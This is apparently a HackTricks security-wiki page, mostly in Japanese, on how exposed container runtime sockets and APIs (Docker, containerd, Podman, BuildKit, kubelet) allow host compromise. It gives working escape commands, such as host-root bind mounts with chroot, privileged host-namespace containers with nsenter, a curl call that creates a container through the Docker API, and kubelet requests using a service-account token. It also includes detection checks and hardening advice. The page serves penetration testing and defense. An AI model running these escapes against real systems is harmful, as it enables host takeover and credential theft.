# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

多くの実際のコンテナ侵害は、namespace escape から始まるわけではありません。runtime control plane へのアクセスから始まります。workload がマウントされた Unix socket や exposed TCP listener 経由で `dockerd`, `containerd`, CRI-O, Podman, または kubelet と通信できる場合、attacker はより高い privileges を持つ新しい container の作成、host filesystem の mount、host namespaces への参加、あるいは機微な node 情報の取得を要求できる可能性があります。そのようなケースでは、runtime API が実際の security boundary であり、そこを compromise することは機能的には host を compromise することにかなり近いです。

そのため、runtime socket exposure は kernel protections とは別に文書化すべきです。通常の seccomp、capabilities、MAC confinement を持つ container でも、`/var/run/docker.sock` や `/run/containerd/containerd.sock` が内部に mount されていれば、1 回の API call で host compromise に至る可能性があります。現在の container の kernel isolation は設計どおりに正常に動作していても、runtime management plane は完全に exposed のままかもしれません。

## Daemon Access Models

Docker Engine は伝統的に、特権 API をローカルの Unix socket `unix:///var/run/docker.sock` 経由で exposed しています。歴史的には、`tcp://0.0.0.0:2375` のような TCP listener や、`2376` 上の TLS-protected listener 経由でリモート exposed されることもありました。強力な TLS と client authentication なしで daemon をリモート exposed すると、Docker API は実質的に remote root interface になります。

containerd, CRI-O, Podman, kubelet も同様に高い影響を持つ surface を exposed します。名前や workflow は異なりますが、ロジックは同じです。interface が caller に workload の作成、host paths の mount、credentials の取得、または実行中の containers の変更を許すなら、その interface は特権的な management channel であり、それに応じて扱うべきです。

よく確認すべき一般的な local paths は:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
より古い、またはより特殊な stack では、`dockershim.sock`、`frakti.sock`、`rktlet.sock` のような endpoint も公開されることがあります。これらは現代の環境ではあまり一般的ではありませんが、見つかった場合は同じ注意を払うべきです。なぜなら、通常の application socket ではなく runtime-control surface を表しているからです。

## Secure Remote Access

daemon を local socket 以外に公開しなければならない場合、接続は TLS で保護し、可能であれば mutual authentication を使うべきです。そうすれば daemon が client を検証し、client も daemon を検証できます。利便性のために Docker daemon を plain HTTP で開放する昔ながらの習慣は、container 管理における最も危険なミスの一つです。なぜなら、API surface は privileged containers を直接作成できるほど強力だからです。

歴史的な Docker 設定パターンは次のようでした:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemdベースのホストでは、daemon communication は `fd://` としても現れることがあり、これは process が自分で直接 bind するのではなく、systemd から事前に open された socket を継承することを意味する。重要なのは正確な syntax ではなく、security consequence である。daemon が厳しく permission 管理された local socket を超えて listen する瞬間、transport security と client authentication は任意の hardening ではなく必須になる。

## Abuse

runtime socket が存在する場合、それがどれかを確認し、compatible client が存在するか、そして raw HTTP または gRPC access が可能かを確認する:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
これらのコマンドは、死んだ path、マウントされているがアクセスできない socket、そして live な privileged API を見分けられるので有用です。client が成功したら、次の疑問は、その API が host bind mount か host namespace sharing 付きで新しい container を起動できるかどうかです。

### When No Client Is Installed

`docker`、`podman`、または他の使いやすい CLI が存在しないからといって、socket が安全だとは限りません。Docker Engine は Unix socket 上で HTTP を話し、Podman は `podman system service` を通じて Docker-compatible API と Libpod-native API の両方を公開します。つまり、`curl` しかない最小限の環境でも、daemon を操作できる可能性があります:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
これは post-exploitation 中に重要です。というのも、defenders は通常の client binaries を削除しても、management socket を mounted のまま残すことがあるからです。Podman hosts では、rootful と rootless の deployments で高価値な path が異なることを覚えておいてください: rootful service instances では `unix:///run/podman/podman.sock`、rootless では `unix://$XDG_RUNTIME_DIR/podman/podman.sock` です。

### Full Example: Docker Socket To Host Root

`docker.sock` に到達できるなら、古典的な escape は host の root filesystem を mount した新しい container を起動し、それからそこへ `chroot` することです:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
これは Docker daemon を通じて host-root の直接実行を可能にします。影響はファイル読み取りだけに限定されません。新しい container に入った後、攻撃者は host ファイルを改変し、credential を収集し、persistence を埋め込み、追加の privileged な workload を起動できます。

### Full Example: Docker Socket To Host Namespaces

攻撃者が filesystem-only access ではなく namespace への entry を好む場合:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
この経路は、現在のコンテナを悪用するのではなく、runtime に明示的な host-namespace exposure を持つ新しい container を作成させることで host に到達する。

### Full Example: containerd Socket

マウントされた `containerd` socket も通常は同様に危険です:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Dockerに近いクライアントがある場合、`nerdctl` は `ctr` より便利なことがあります。なぜなら、`--privileged`、`--pid=host`、`-v` のような見慣れたフラグを提供しているからです:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
その影響は、再び host compromise です。Docker固有のツールがなくても、別の runtime API が同じ管理権限を提供することがあります。Kubernetes node では、`crictl` も CRI endpoint に直接話しかけるため、reconnaissance と container interaction に十分な場合があります。

### BuildKit Socket

`buildkitd` は見落とされやすいです。人々はしばしばこれを「単なる build backend」と考えますが、daemon は依然として特権的な control plane です。到達可能な `buildkitd.sock` があると、攻撃者は任意の build step を実行し、worker の能力を調べ、侵害された環境から local context を使用し、daemon がそれらを許可するよう設定されている場合は `network.host` や `security.insecure` のような危険な entitlement を要求できます。

最初に役立つ操作は次のとおりです:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
daemon が build リクエストを受け付ける場合、insecure entitlements が利用可能かどうかを確認してください:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
正確な影響は daemon 設定に依存するが、許可の緩い entitlements を持つ rootful BuildKit service は、無害な developer convenience ではない。特に CI runners や共有 build node 上では、これを別の高価値な administrative surface として扱うべきだ。

### Kubelet API Over TCP

kubelet は container runtime ではないが、それでも node management plane の一部であり、しばしば同じ trust boundary の議論に入る。kubelet の secure port `10250` が workload から到達可能である場合、または node credentials、kubeconfigs、あるいは proxy rights が露出している場合、攻撃者は Kubernetes API server の admission path に一切触れることなく、Pods の列挙、logs の取得、または node-local containers 内での commands 実行ができる可能性がある。

まずは cheap discovery から始める:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
kubelet または API-server proxy の path が `exec` を authorize する場合、WebSocket 対応の client はそれを使って node 上の他の containers で code execution を実現できる。これが、`get` permission だけの `nodes/proxy` が見た目以上に dangerous な理由でもある。request は依然として commands を execute する kubelet endpoints に到達でき、そうした direct な kubelet interactions は通常の Kubernetes audit logs には表示されない。

## Checks

これらの checks の目的は、container が trust boundary の外側に残っているはずの任意の management plane に reach できるかどうかに答えることだ。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
興味深い点は次のとおりです。

- マウントされた runtime socket は、単なる情報漏えいではなく、通常は直接的な管理用 primitive です。
- `2375` の TCP listener が TLS なしで公開されている場合は、リモート侵害の条件として扱うべきです。
- `DOCKER_HOST` のような環境変数は、workload が host runtime と通信するよう意図的に設計されていたことを示すことがよくあります。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでは local Unix socket | `dockerd` は local socket で listen し、daemon は通常 rootful です | `/var/run/docker.sock` の mounting、`tcp://...:2375` の exposure、`2376` での TLS が弱い、または欠如している |
| Podman | デフォルトでは daemonless CLI | 通常の local 利用に長期稼働する privileged daemon は不要です。`podman system service` が有効な場合は API sockets が exposure されることがあります | `podman.sock` の exposure、service を広く公開して running、rootful API use |
| containerd | local privileged socket | Administrative API は local socket 経由で exposure され、通常はより高レベルの tooling から利用されます | `containerd.sock` の mounting、`ctr` または `nerdctl` への広範な access、privileged namespaces の exposure |
| CRI-O | local privileged socket | CRI endpoint は node-local の trusted components 向けです | `crio.sock` の mounting、CRI endpoint を untrusted workloads に exposure すること |
| Kubernetes kubelet | node-local management API | Kubelet は Pod から広く reach 可能であるべきではありません。認証/認可の状態によっては、access により pod state、credentials、execution 機能が exposure されることがあります | kubelet sockets や certs の mounting、弱い kubelet auth、host networking と reach 可能な kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
